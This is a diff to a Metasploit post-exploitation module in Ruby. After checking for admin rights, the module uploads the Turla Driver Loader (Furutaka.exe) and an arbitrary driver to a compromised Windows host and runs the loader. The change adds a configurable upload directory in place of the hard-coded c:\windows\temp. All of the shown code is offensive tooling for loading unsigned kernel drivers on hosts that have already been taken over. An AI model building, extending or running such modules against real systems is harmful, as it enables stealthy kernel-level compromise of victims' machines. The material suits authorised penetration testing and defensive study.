@@ -31,12 +31,13 @@ class MetasploitModule < Msf::Post
 
     register_options([
       OptString.new('DRIVER', [false,'Driver file to install']),
-      OptPath.new('TDL', [false,'Path to Turla Driver Loader',])
+      OptPath.new('TDL', [false,'Path to Turla Driver Loader',]),
+      OptString.new('REMOTEPATH', [false,'Writable directory on target']),
     ])
 
   end
 
-  def upload_files(file, rfilename, directory="c:\\windows\\temp\\")
+  def upload_files(file, rfilename, directory)
     begin
       print_status("Target #{directory + rfilename} being uploaded..")
       write_file(directory + rfilename, file)
@@ -60,7 +61,14 @@ class MetasploitModule < Msf::Post
     else
       tdl_local = File.open(File.join(Msf::Config.local_directory, "tdl", "Furutaka.exe"))
     end
- 
+    
+    if datastore['REMOTEPATH'].to_s.length > 0
+      print_status("Target directory #{datastore['REMOTEPATH']}")
+      remote_path = datastore['REMOTEPATH']
+    else
+      remote_path = "c:\\windows\\temp\\"
+    end
+
     unless ((is_admin?) && session.platform.include?("windows"))
       fail_with(Failure::None, 'Insufficient privileges or unsupported operating system')
     end
@@ -76,10 +84,10 @@ class MetasploitModule < Msf::Post
     driver_local.close
 
     print_status("Uploading Turla driver loader ...")
-    upload_files(hfile, tdl_rfile)
+    upload_files(hfile, tdl_rfile, remote_path)
 
     print_status("Uploading driver ....")
-    upload_files(hdrv, driver_rfile)
+    upload_files(hdrv, driver_rfile, remote_path)
 
     print_status("Executing TDL ...")
 
